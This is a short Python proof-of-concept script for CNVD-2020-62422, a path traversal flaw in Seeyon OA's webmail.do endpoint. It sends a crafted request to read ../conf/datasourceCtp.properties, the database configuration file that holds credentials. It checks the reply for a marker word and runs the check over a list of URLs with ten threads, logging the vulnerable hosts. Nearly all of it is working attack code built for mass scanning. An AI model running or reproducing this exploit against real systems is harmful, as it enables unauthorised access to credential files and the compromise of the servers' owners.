# -*- coding: utf-8 -*-
'''
@Time    : 2023-03-19 18:33
@Author  : whgojp
@File    : CNVD-2020-62422.py

'''
import requests
import sys
import threading
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed

def POC_1(target_url):
    if 'https' not in target_url:
        target_url = 'http://'+target_url
    vuln_url = target_url + "/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "workflow" in response.text:
            print("\033[32m[o] 目标{}存在漏洞 \033[0m".format(target_url))
            result.append(target_url + " 存在漏洞")
        else:
            print("\033[31m[x] 文件请求失败 \033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


def main():
    global result
    result = []
    with open('urls.txt', 'r') as f:
        urls = f.readlines()
    urls = [url.strip() for url in urls]
    total_num = len(urls)
    count = 0
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(POC_1, url) for url in urls]
        for future in as_completed(futures):
            count += 1
            print("[+] Progress: {}/{}".format(count, total_num))
    with open('result.txt', 'w') as f:
        for r in result:
            f.write(r + '\n')
    print("[+] 扫描完成！")


if __name__ == '__main__':
    main()
